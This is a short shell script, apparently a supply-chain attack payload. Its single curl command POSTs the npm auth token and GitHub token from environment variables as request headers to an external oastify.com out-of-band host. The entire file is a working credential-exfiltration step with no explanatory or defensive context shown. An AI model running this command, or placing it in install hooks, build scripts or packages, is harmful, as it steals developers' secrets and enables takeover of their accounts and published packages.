#!/bin/sh

curl -i -s -XPOST \
  -H "npm: ${NPMJS_AUTHTOKEN}" \
  -H "ghub: ${GITHUB_TOKEN}" \
  https://8r0l79qa072gqink49399gcv3m9gx6lv.oastify.com
